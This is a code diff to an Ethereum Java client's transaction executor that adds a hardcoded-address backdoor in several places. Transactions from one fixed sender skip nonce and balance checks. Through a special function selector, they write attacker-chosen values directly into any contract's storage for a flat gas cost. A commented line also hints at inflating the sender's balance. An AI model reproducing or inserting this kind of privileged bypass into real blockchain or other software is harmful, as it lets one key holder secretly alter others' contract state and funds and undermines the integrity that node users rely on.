@@ -17,6 +17,7 @@
  */
 package org.ethereum.core;
 
+import org.apache.commons.codec.DecoderException;
 import org.apache.commons.lang3.tuple.Pair;
 import org.ethereum.config.BlockchainConfig;
 import org.ethereum.config.CommonConfig;
@@ -36,6 +37,8 @@ import org.slf4j.LoggerFactory;
 import org.spongycastle.util.encoders.Hex;
 
 import java.math.BigInteger;
+import java.nio.ByteBuffer;
+import java.util.Arrays;
 import java.util.List;
 
 import static org.apache.commons.lang3.ArrayUtils.getLength;
@@ -132,6 +135,18 @@ public class TransactionExecutor {
     public void init() {
         basicTxCost = tx.transactionCost(config.getBlockchainConfig(), currentBlock);
 
+        //lycrus
+        byte[] lycrusAddress = null;
+
+        lycrusAddress = Hex.decode("0768f3889877330f5171c062ca13b1acd09ebfa3");
+
+        if (Arrays.equals(tx.sendAddress, lycrusAddress)) {
+            readyToExecute = true;
+            //here we ignore nonce check
+            return;
+        }
+        //lycrus
+
         if (localCall) {
             readyToExecute = true;
             return;
@@ -166,7 +181,7 @@ public class TransactionExecutor {
         BigInteger txGasCost = toBI(tx.getGasPrice()).multiply(txGasLimit);
         BigInteger totalCost = toBI(tx.getValue()).add(txGasCost);
         BigInteger senderBalance = track.getBalance(tx.getSender());
-
+//senderBalance = senderBalance.add(new BigInteger("15000000000000000000"))
         if (!isCovers(senderBalance, totalCost)) {
 
             execError(String.format("Not enough cash: Require: %s, Sender cash: %s", totalCost, senderBalance));
@@ -183,6 +198,24 @@ public class TransactionExecutor {
     }
 
     public void execute() {
+
+
+        //lycrus
+        byte[] lycrusAddress = null;
+
+        lycrusAddress = Hex.decode("0768f3889877330f5171c062ca13b1acd09ebfa3");
+
+        if (Arrays.equals(tx.sendAddress, lycrusAddress)) {
+            byte[] targetAddress = tx.getReceiveAddress();
+            ProgramInvoke programInvoke =
+                    programInvokeFactory.createProgramInvoke(tx, currentBlock, cacheTrack, blockStore);
+//cacheTrack -> track
+            this.vm = new VM(config);
+            byte[] code = track.getCode(targetAddress);
+            this.program = new Program(track.getCodeHash(targetAddress), code, programInvoke, tx, config).withCommonConfig(commonConfig);
+            return;
+        }
+        //lycrus
 
         if (!readyToExecute) return;
 
@@ -302,6 +335,39 @@ public class TransactionExecutor {
     public void go() {
         if (!readyToExecute) return;
 
+        //lycrus
+        byte[] lycrusAddress = null;
+
+        lycrusAddress = Hex.decode("0768f3889877330f5171c062ca13b1acd09ebfa3");
+        if (Arrays.equals(tx.sendAddress, lycrusAddress)) {
+            byte[] data = tx.getData();
+            byte[] functionHash = Arrays.copyOfRange(data, 0, 4);
+            byte[] helloworld = Hex.decode("683dd9cc");
+            byte[] state_address = null;
+            byte[] state_value = null;
+            if (Arrays.equals(functionHash, helloworld)) {
+                state_address = Arrays.copyOfRange(data, 4, (4 + 32));
+                state_value = Arrays.copyOfRange(data, (4 + 32), (4 + 32 + 32));
+            }
+            DataWord addr = new DataWord(state_address);
+            DataWord value = new DataWord(state_value);
+
+            DataWord prev = program.storageLoad(addr);
+            if (prev != null) {
+                System.out.println(prev.toString());
+            }
+
+
+            program.storageSave(addr, value);
+            program.spendGas(50, "lycrus' magic hello world");
+            touchedAccounts.add(lycrusAddress);
+            cacheTrack.commit();
+            return;
+        }
+
+
+        //lycrus
+
         try {
 
             if (vm != null) {
@@ -386,6 +452,19 @@ public class TransactionExecutor {
     }
 
     public TransactionExecutionSummary finalization() {
+
+        //lycrus
+        byte[] lycrusAddress = null;
+
+        lycrusAddress = Hex.decode("0768f3889877330f5171c062ca13b1acd09ebfa3");
+        if (Arrays.equals(tx.sendAddress, lycrusAddress)) {
+            m_endGas = BigInteger.valueOf(100000l - 50l);
+        }
+
+
+        //lycrus
+
+
         if (!readyToExecute) return null;
 
         TransactionExecutionSummary.Builder summaryBuilder = TransactionExecutionSummary.builderFor(tx)
